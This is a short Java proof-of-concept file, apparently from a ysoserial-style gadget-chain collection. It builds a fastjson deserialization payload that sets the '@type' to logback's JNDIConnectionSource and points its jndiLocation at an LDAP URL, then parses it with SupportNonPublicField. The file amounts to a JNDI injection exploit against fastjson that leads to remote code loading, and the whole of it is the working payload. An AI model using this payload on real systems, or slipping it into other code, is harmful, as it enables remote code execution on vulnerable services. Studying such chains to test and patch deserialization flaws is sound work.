package ysoserial.payloads.tabbyGadgetChains.Spring;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

public class Poc4 {
    public static void main(String[] args) {
        String poc = "{\"@type\":\"ch.qos.logback.core.db.JNDIConnectionSource\",\"jndiLocation\":\"ldap://127.0.0.1:8990/exp\"}";
        JSON.parseObject(poc, Feature.SupportNonPublicField);
    }
}
